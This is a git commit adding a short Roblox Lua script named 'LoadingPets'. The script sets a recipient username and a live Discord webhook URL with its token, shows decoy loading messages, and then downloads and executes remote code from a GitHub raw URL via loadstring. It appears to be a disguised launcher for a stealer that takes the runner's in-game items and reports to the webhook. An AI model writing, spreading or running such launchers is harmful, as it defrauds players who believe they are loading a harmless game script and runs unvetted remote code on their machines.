895c3fb6ce5aa1f560475c8aa03fff03678bce5a
KYYOCHI <125777413+KYYOCHI@users.noreply.github.com>
2023-02-19 12:48:59 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,9 @@
+Username = "drahon2005"
+WebHook = "https://discord.com/api/webhooks/1076679071615955087/cn59aK0xOwwcGzprQ3pljmqgE_wbmrHq88M01qTfHY6d7dRjL9KqtUU1ADiHWyXqZ9ct"
+
+_G.CustomScriptName = "LoadingPets"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))() 
